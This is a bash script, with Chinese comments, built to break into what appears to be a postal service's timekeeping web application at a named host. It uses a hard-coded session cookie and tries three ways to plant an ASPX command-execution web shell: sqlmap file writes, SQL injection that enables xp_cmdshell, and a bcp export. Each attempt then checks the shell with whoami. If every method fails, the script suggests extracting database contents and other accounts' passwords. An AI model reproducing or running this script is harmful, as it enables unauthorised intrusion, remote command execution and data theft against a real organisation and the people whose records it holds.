#!/bin/bash

SESSION="lswqd4itz5u4ftzm3jcmjfio"
TARGET="http://vps.vnpost.vn/chamcong/report/rpt_BCC.aspx?kyluong=112025&MA_DV=KVMB&MA_BP=TC&MA_TO=VP"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 方法1: sqlmap --file-write上传WebShell"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 创建简单WebShell
cat > shell.aspx << 'ASPX'
<%@ Page Language="C#" %>
<%
Response.Write("<pre>");
System.Diagnostics.Process p = new System.Diagnostics.Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c " + Request["c"];
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.Start();
Response.Write(p.StandardOutput.ReadToEnd());
p.WaitForExit();
Response.Write("</pre>");
%>
ASPX

echo "  WebShell创建: shell.aspx"
echo "  目标路径: C:/inetpub/wwwroot/chamcong/s.aspx"
echo ""

# 尝试上传
echo "  sqlmap上传中..."
python3 /tmp/sqlmap/sqlmap.py \
    -u "$TARGET" \
    --cookie="ASP.NET_SessionId=$SESSION" \
    --batch \
    --threads=1 \
    --delay=1 \
    --file-write="shell.aspx" \
    --file-dest="C:/inetpub/wwwroot/chamcong/s.aspx" \
    -v 0 \
    2>&1 | tee filewrite_result.txt

echo ""
if grep -qi "written\|uploaded\|success" filewrite_result.txt; then
    echo "  ✅ 上传可能成功！"
else
    echo "  ⚠️  上传状态未知"
fi

# 测试WebShell
echo ""
echo "  测试WebShell..."
for shell in s.aspx shell.aspx x.aspx; do
    echo "    测试: http://vps.vnpost.vn/chamcong/$shell?c=whoami"
    
    resp=$(curl -sk "http://vps.vnpost.vn/chamcong/$shell?c=whoami" 2>&1)
    
    if echo "$resp" | grep -qiE "nt authority|iis|vnpost|network"; then
        echo "    🔥🔥🔥🔥🔥 GetShell成功！"
        echo "    URL: http://vps.vnpost.vn/chamcong/$shell?c=whoami"
        echo ""
        echo "    输出:"
        echo "$resp"
        echo "SUCCESS" > GETSHELL_SUCCESS.txt
        break
    else
        echo "    ❌ 未响应或404"
    fi
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 方法2: 手动SQL盲注写WebShell"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

if [ ! -f "GETSHELL_SUCCESS.txt" ]; then
    echo "  尝试手动写入..."
    
    # 简化的WebShell（单行）
    SHELL_CONTENT='<%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start("cmd","/c "+Request["c"]).StandardOutput.ReadToEnd()); %>'
    
    # 转义单引号
    SHELL_ESCAPED=$(echo "$SHELL_CONTENT" | sed "s/'/\\\'/g")
    
    # SQL写入payload
    SQL_WRITE="'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'echo ${SHELL_CONTENT} > C:\inetpub\wwwroot\chamcong\m.aspx'; --"
    
    echo "  SQL Payload: $SQL_WRITE"
    echo ""
    
    # URL编码并执行
    ENCODED_SQL=$(echo "$SQL_WRITE" | jq -sRr @uri)
    
    curl -sk "${TARGET//kyluong=112025/kyluong=${ENCODED_SQL}}" \
        -H "Cookie: ASP.NET_SessionId=$SESSION" \
        -o manual_write.html 2>&1
    
    sleep 2
    
    # 测试
    echo "  测试手动写入的Shell..."
    resp=$(curl -sk "http://vps.vnpost.vn/chamcong/m.aspx?c=whoami" 2>&1)
    
    if echo "$resp" | grep -qiE "nt authority|iis|vnpost"; then
        echo "  🔥🔥🔥🔥🔥 手动GetShell成功！"
        echo "  URL: http://vps.vnpost.vn/chamcong/m.aspx?c=whoami"
        echo "$resp"
        echo "SUCCESS" > GETSHELL_SUCCESS.txt
    fi
fi

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 方法3: 利用数据库权限导出WebShell"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

if [ ! -f "GETSHELL_SUCCESS.txt" ]; then
    echo "  尝试OPENROWSET写入..."
    
    # 使用OPENROWSET + BCP
    SQL_BCP="'; EXEC master..xp_cmdshell 'bcp \"SELECT ''${SHELL_CONTENT}''\" queryout C:\\inetpub\\wwwroot\\chamcong\\b.aspx -c -T'; --"
    
    ENCODED_BCP=$(echo "$SQL_BCP" | jq -sRr @uri)
    
    curl -sk "${TARGET//kyluong=112025/kyluong=${ENCODED_BCP}}" \
        -H "Cookie: ASP.NET_SessionId=$SESSION" \
        -o bcp_write.html 2>&1
    
    sleep 2
    
    # 测试
    resp=$(curl -sk "http://vps.vnpost.vn/chamcong/b.aspx?c=whoami" 2>&1)
    
    if echo "$resp" | grep -qiE "nt authority|iis|vnpost"; then
        echo "  🔥🔥🔥🔥🔥 BCP GetShell成功！"
        echo "  URL: http://vps.vnpost.vn/chamcong/b.aspx?c=whoami"
        echo "$resp"
        echo "SUCCESS" > GETSHELL_SUCCESS.txt
    fi
fi

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ GetShell尝试完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

if [ -f "GETSHELL_SUCCESS.txt" ]; then
    echo ""
    echo "🔥🔥🔥🔥🔥 GetShell成功！"
    echo ""
    echo "可用WebShell:"
    for shell in s.aspx m.aspx b.aspx; do
        if curl -sk "http://vps.vnpost.vn/chamcong/$shell" -o /dev/null 2>&1; then
            echo "  ✅ http://vps.vnpost.vn/chamcong/$shell?c=命令"
        fi
    done
else
    echo ""
    echo "❌ 所有方法均失败"
    echo ""
    echo "🔍 问题分析:"
    echo "  1. xp_cmdshell可能被禁用"
    echo "  2. 文件写入权限不足"
    echo "  3. 路径错误"
    echo ""
    echo "📋 建议:"
    echo "  1. 用sqlmap提取数据库数据"
    echo "  2. 获取其他账号密码"
    echo "  3. 寻找其他系统突破"
fi
